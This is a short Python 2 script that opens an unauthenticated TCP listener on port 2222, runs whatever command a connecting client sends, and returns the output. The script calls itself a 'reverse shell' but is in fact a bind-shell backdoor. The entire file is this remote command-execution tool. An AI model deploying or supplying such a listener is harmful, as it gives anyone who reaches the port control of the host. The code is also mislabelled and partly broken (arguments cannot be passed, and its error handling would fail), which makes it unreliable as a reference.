#!/usr/bin/python2

import SocketServer
import subprocess

port = 2222

class Pipe(SocketServer.StreamRequestHandler):
    def handle(self):
        error = False
        self.wfile.write("Enter a Command: ".encode())
        argstring = self.rfile.readline().strip()
        try:
            stdout_val = subprocess.check_output([argstring])
        except subprocess.CalledProcessError as process_error:
            error = True
        if not error:
            self.wfile.write(stdout_val)
        elif process_error:
            self.wfile.write(process_error.returncode)

class NServer(SocketServer.ThreadingTCPServer):
    daemon_threads = True
    pass

if __name__ == "__main__":
    wz = NServer(('', port), Pipe)
    print("Opened reverse shell on port " + str(port))
    wz.serve_forever()
